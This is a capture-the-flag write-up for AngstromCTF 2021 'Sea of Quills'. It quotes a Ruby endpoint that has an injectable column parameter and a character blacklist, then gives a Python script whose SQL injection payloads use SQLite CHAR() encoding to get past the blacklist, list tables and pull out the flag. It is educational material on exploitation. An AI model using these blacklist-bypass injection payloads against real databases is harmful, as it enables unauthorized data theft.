# AngstromCTF2021 Sea of Quills
Looking at the sourcecode we notice the lines:
```
blacklist = ["-", "/", ";", "'", "\""]

blacklist.each { |word|
  if cols.include? word
    return "beep boop sqli detected!"
  end
}


if !/^[0-9]+$/.match?(lim) || !/^[0-9]+$/.match?(off)
  return "bad, no quills for you!"
end

@row = db.execute("select %s from quills limit %s offset %s" % [cols, lim, off])
```

We immediately see that the parameter `cols` is injectable. We do however need to take care that our query dosen't use any of the blacklisted characters. Fortunatly the SQLite dbms has a function called `CHAR` that takes integers as arguments and convert them to their ascii representation.

We can now code up our payload:
```
import requests

url = "https://seaofquills.2021.chall.actf.co/quills"

# Find table names
# We can use the CHAR method to insert strings and circumvent the filter
# CHAR(0x74,0x61,0x62,0x6c,0x65) outputs 'table'
payload = {
    "limit":"5",
    "offset":"1",
    "cols":"name,name,name FROM sqlite_master WHERE type=CHAR(0x74,0x61,0x62,0x6c,0x65) UNION select desc,url,name"
    }

r = requests.post(url,params=payload)
print(r.text)
# This returns the tablename `flagtable`

# Use tablename to extract flag
payload = {
    "limit":"5",
    "offset":"1",
    "cols":"* FROM flagtable UNION select desc"
}

r = requests.post(url,params=payload)
print(r.text)
```
Running the solution we find the flag: `actf{and_i_was_doing_fine_but_as_you_came_in_i_watch_my_regex_rewrite_f53d98be5199ab7ff81668df}`
